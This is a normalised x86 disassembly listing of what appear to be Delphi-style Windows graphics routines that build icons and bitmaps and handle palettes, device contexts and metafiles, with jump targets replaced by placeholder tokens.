mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407c80
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_425af8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425aff
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026fc
retn
call sub_424d5c
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_4257a8
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_4257b4
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_425b64
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_424ce4
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402ba4
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424f94
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_425c48
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_425b64
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_425cb4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_425b64
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425d51
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425d58
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_425d88
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402ba4
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402ba4
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_425d7c
xor edx edx
push ebp
push sub_425f76
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_425c48
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_425c48
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_425f4f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407c80
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407c80
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407c80
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407c80
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_425cb4
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_425cb4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f56
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026fc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026fc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026fc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026fc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_425f56
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f7d
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_425f84
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403160
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_425fd4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_42602c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_425fd4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426075
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4030d8
mov edi eax
mov eax esi
call sub_4030d8
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4261af
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426192
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407dac
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426199
mov al 0x1
sub_4261c8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ad54
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426210
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426217
mov eax [ ebp - 0x4 ]
call sub_403190
retn
sub_42621c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_426250
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ad54
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42629b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262a2
mov eax [ ebp - 0x4 ]
call sub_403190
retn
sub_4262c8
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_426346
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_418470
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_4030e0
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_404184
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40432c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42634d
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4263b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_426464
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_426464
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_426464
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_426438
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403190
mov eax [ esi + 0x8 ]
call sub_403190
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_426464
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_418314
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4264a8
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_418314
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4264cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
mov edx ebx
mov eax [ esi + 0x8 ]
call sub_418470
cmp di ax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418470
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_426528
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_426558
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4030d8
mov edx eax
mov eax [ ebx + 0xc ]
call sub_40331c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418b68
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_42658c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_40331c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403190
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4033a4
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_4033a4
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40338c
sub_426608
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_426698
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403190
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_4030d8
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4033a4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4033a4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4266b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_4264cc
mov esi eax
test esi esi
jne r-xdata
mov dl 0x1
mov eax esi
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42672f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4033a4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
call sub_424ccc
mov eax [ ebx + 0xc ]
call sub_403190
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4033a4
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40338c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_42677c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x60 ]
sub_4267f0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_426608
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_426608
jmp r-xdata
mov edx ebx
mov eax esi
call sub_418a84
mov edx ebx
mov eax esi
call sub_426608
jmp r-xdata
pop esi
pop ebx
retn
sub_42684c
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_426870
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_426898
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42699f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_404184
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_4262c8
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403190
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426921
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4269a6
lea eax [ ebp - 0x48 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4033a4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4033a4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_426926
mov eax [ ebp - 0x4 ]
call sub_403190
call sub_403984
call sub_4039d8
mov eax [ ebx + 0xc ]
call sub_403190
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4269a6
lea eax [ ebp - 0x48 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4033a4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4033a4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_4269b0
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_4030e0
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402a94
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_426a0c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_426a88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_426898
mov eax [ ebp - 0x8 ]
push eax
push sub_4269b0
push ebp
call sub_426a0c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426ad1
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_422cb0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_426b14
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_425f84
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
